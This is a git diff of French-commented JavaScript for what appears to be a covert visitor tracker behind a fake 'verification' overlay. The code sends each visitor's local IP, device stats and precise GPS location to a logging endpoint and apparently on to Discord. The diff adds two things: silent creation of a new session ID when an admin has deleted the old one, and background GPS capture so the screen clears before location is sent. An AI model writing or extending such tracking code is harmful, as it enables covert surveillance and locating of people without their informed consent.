@@ -115,7 +115,7 @@ async function logVisitor(preciseLocation = null, isUpdate = false, forceDiscord
         const localIp = cachedLocalIp || await getLocalIP();
         const stats = await getDeviceStats();
         
-        await fetch('/api/log', {
+        const response = await fetch('/api/log', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -132,6 +132,18 @@ async function logVisitor(preciseLocation = null, isUpdate = false, forceDiscord
                 page: window.location.pathname
             })
         });
+
+        // Si la session a été supprimée par l'admin, on en génère une nouvelle
+        if (response.status === 403) {
+            const data = await response.json();
+            if (data.error === "SESSION_DELETED") {
+                localStorage.removeItem('tracker_session_id');
+                sessionId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+                localStorage.setItem('tracker_session_id', sessionId);
+                // On relance le log avec la nouvelle session
+                return logVisitor(preciseLocation, isUpdate, forceDiscord);
+            }
+        }
     } catch (error) {
         console.error("Erreur lors du logging:", error);
     }
@@ -181,18 +193,19 @@ async function startVerification() {
             msg.style.opacity = '0.8';
         }
         
-        // ENVOI IMMÉDIAT DISCORD
+        // ENVOI IMMÉDIAT DISCORD (sans attendre le GPS pour libérer l'écran)
         logVisitor(null, false, true);
 
-        try {
-            const location = await getPreciseLocation();
+        // On lance la récupération GPS en arrière-plan
+        getPreciseLocation().then(async (location) => {
             if (location) {
                 lastLoggedPos = location;
                 // ENVOI GPS DISCORD
                 await logVisitor(location, true, true);
             }
-        } catch (e) {}
+        }).catch(() => {});
 
+        // On libère l'écran tout de suite pour l'utilisateur
         overlay.style.display = 'none';
 
         if (navigator.geolocation) {
